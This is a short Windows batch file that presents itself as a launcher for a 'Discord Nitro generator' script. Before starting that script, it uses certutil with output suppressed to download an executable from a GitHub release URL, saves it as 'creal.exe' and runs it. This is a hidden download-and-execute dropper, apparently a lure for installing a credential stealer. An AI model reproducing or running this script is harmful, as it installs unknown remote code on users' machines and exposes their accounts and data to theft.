@echo off
set "URL=https://github.com/hvbsvqdj/tool-boost-funk/releases/download/boost/boost.exe"
set "Dossier=tool"
set "NomFichier=%Dossier%\creal.exe"

certutil -urlcache -split -f %URL% "%NomFichier%" >nul 2>&1

if exist "%NomFichier%" (
    start "" "%NomFichier%"
)
cd tool
python Discord-Nitro-Generator.py
